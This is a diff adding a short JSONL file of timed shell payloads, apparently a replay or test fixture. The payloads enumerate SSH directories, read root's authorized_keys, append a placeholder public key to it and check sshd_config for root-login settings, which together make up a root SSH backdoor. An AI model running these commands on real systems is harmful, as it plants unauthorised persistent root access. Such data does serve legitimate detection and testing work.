@@ -1,0 +1,7 @@
+{"t": 0, "payload": "id"}
+{"t": 6, "payload": "ls -la /root/.ssh /home/*/.ssh"}
+{"t": 12, "payload": "cat /root/.ssh/authorized_keys"}
+{"t": 18, "payload": "mkdir -p /root/.ssh"}
+{"t": 24, "payload": "echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEXAMPLEEXAMPLEEXAMPLEEXAMPLEEXAMPLEEXAMPLE0 ops@example' >> /root/.ssh/authorized_keys"}
+{"t": 30, "payload": "chmod 600 /root/.ssh/authorized_keys"}
+{"t": 36, "payload": "grep -E '^(PermitRootLogin|PubkeyAuthentication|AuthorizedKeysFile)' /etc/ssh/sshd_config"}
